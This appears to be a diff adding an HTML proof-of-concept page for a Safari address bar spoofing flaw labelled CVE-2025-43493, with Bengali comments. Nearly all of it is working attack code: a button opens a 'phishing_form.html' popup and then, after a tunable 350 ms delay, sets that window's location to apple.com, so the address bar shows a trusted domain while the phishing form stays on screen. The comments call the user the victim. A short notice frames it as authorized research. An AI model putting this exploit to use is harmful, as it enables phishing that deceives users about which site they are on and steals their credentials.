@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Research Lab - CVE-2025-43493 PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; marginTop: 50px; }
+        button { padding: 15px 30px; font-size: 16px; background-color: #0070c9; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        button:hover { background-color: #005194; }
+    </style>
+</head>
+<body>
+
+    <h2>CVE-2025-43493: Safari Address Bar Spoofing Demonstration</h2>
+    <p><strong>Notice:</strong> This environment is configured for authorized penetration testing and security research only.</p>
+    
+    <!-- ভিকটিমকে ইন্টারঅ্যাক্ট করানোর জন্য বাটন -->
+    <button onclick="executeSpoof()">Launch Vulnerability Test</button>
+
+    <script>
+        function executeSpoof() {
+            // ১. একটি নতুন উইন্ডো বা ট্যাব ওপেন করা যেখানে টার্গেট বাফারিং রিকোয়েস্ট যাবে
+            let targetWin = window.open("phishing_form.html", "_blank", "width=600,height=700");
+
+            // ২. টাইমিং রেস কন্ডিশন তৈরি করা (Race Condition / State Inconsistency)
+            // ব্রাউজার যখন পেজটি লোড করছে, ঠিক তখনই অবজেক্ট লোকেশন ফোর্স-চেঞ্জ করা হয়
+            setTimeout(function() {
+                try {
+                    // অ্যাড্রেস বারকে ধোঁকা দিয়ে ট্রাস্টেড লিংকে পুশ করা কিন্তু UI থ্রেডকে ব্লক রাখা
+                    targetWin.location = "https://apple.com";
+                } catch(e) {
+                    console.log("State interaction intercepted.");
+                }
+            }, 350); // সাফারির রেন্ডারিং ইঞ্জিন ও নেটওয়ার্ক থ্রেডের টাইমিং গ্যাপ (মিলিসেকেন্ডে টিউন করতে পারেন)
+        }
+    </script>
+
+</body>
+</html>
